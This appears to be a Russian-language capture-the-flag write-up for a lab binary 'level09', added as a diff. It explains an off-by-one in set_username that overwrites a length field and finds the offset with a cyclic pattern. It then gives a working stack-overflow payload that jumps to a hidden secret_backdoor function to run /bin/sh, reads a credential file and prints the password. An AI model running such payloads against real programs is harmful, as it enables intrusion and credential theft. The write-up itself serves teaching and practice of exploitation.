@@ -1,0 +1,79 @@
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: bcharity
+>: Welcome, bcharity
+>: Msg @Unix-Dude
+
+
+gdb> disass handle_msg
+[...]
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]                           ; общий размер 192 байта
+   0x00005555555548d2 <+18>:	add    rax,0x8c                                 ; поле 140 byбайт
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0                 ; 40 bytes
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c                 ; 8 bytes
+
+Если привести в нормальный вид
+
+typedef struct s_message
+{
+    char text[140];
+    char username[40];//размер 40
+	int len; //
+}
+
+Можно найти многообещающую функцию которая нигде не используется secret_backdoor
+Она запускает то что мы туда положем через систем.
+
+Пытаемся найти что нибудь что поможет ее запустить.
+В функции set_username можно строчки которые можно на си
+ представить так :
+ for (i = 0; i <= 0x28 && local_buffer[i]; i++) {
+        message->username[i] = local_buffer[i];
+    }
+
+0x28 = (41)
+Размер username 40 байт, а буффер перезаписывается для 41 байта
+
+Используя свойства структуры можем перезаписать 1 старший(самый большой)  байт в значение  len в структуре
+
+и, в свою очередь, изменить параметр размера для strncpy() вызова set_msg()на любое значение от 0 до 255.
+
+Проверяем теорию
+ ./level09 < <(python -c "print 'A' * 40 + '\xff' + '\n'")
+ Как и предполагалось программа упала.
+
+Находим смещение.
+Используем генератор шаблонов переполнения
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+https://xakep.ru/2021/07/17/nezumi-hacking-guide-14/
+https://habr.com/ru/post/183376/
+Размер  255
+
+ Включаем gdb и запускаем
+ r < <(python -c "print 'A' * 40 + '\xff' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A'")
+
+info r
+
+rbp            0x6741356741346741       0x6741356741346741
+
+0x6741356741346741  - смещение 192
+
+для того что бы перейти к регистру rsp добавляем 8 к смещению rbp
+
+Регистр %rbp — это указатель базы, который указывает на базу текущего стекового фрейма,
+а %rsp — указатель стека, который указывает на вершину текущего стекового фрейма
+
+итого получаем 40 + '\xff' + '\n' + 'A' * 200 + адрес неиспользуемой секретной функции + '/bin/sh'
+(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat) | ./level09
+
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
